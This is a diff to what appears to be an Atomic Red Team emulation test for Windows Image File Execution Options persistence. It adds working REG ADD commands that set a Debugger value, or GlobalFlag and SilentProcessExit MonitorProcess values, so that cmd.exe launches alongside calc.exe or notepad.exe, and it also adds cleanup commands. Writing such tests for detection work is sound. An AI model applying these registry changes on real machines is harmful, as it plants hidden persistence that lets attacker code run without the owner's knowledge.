@@ -5,43 +5,48 @@ display_name: Image File Execution Options
 atomic_tests:
 - name: IFEO Add Debugger
   description: |
-    TODO
-
+    Leverage Global Flags Settings
   supported_platforms:
     - windows
   input_arguments:
     target_binary:
       description: Binary To Attach To
       type: Path
-      default: winword.exe
+      default: C:\Windows\System32\calc.exe
     payload_binary:
       description: Binary To Execute
       type: Path
-      default: cmd.exe
-
+      default: C:\Windows\System32\cmd.exe
   executor:
     name: command_prompt
+    elevation_required: true
     command: |
       REG ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\#{target_binary}" /v Debugger /d "#{payload_binary}"
+    cleanup_command: |
+      reg delete "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\#{target_binary}" /v Debugger /f >nul 2>&1
 
-- name: IFEO GLobal Flags
+- name: IFEO Global Flags
   description: |
     Leverage Global Flags Settings
-
   supported_platforms:
     - windows
-
   input_arguments:
     target_binary:
       description: Binary To Attach To
       type: Path
-      default: notepad.exe
+      default: C:\Windows\System32\notepad.exe
     payload_binary:
       description: Binary To Execute
       type: Path
-      default: cmd.exe
-
+      default: C:\Windows\System32\cmd.exe
   executor:
     name: command_prompt
+    elevation_required: true
     command: |
-      REG ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\#{target_binary}" /v GlobalFlag /t REG_DWORD /d 512 REG ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\#{target_binary}" /v ReportingMode /t REG_DWORD /d 1 REG ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\#{target_binary}" /v MonitorProcess /d "#{payload_binary}"
+      REG ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\#{target_binary}" /v GlobalFlag /t REG_DWORD /d 512
+      REG ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\#{target_binary}" /v ReportingMode /t REG_DWORD /d 1
+      REG ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\#{target_binary}" /v MonitorProcess /d "#{payload_binary}"
+    cleanup_command: |
+      reg delete "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\#{target_binary}" /v GlobalFlag /f >nul 2>&1
+      reg delete "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\#{target_binary}" /v ReportingMode /f >nul 2>&1
+      reg delete "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\#{target_binary}" /v MonitorProcess /f >nul 2>&1
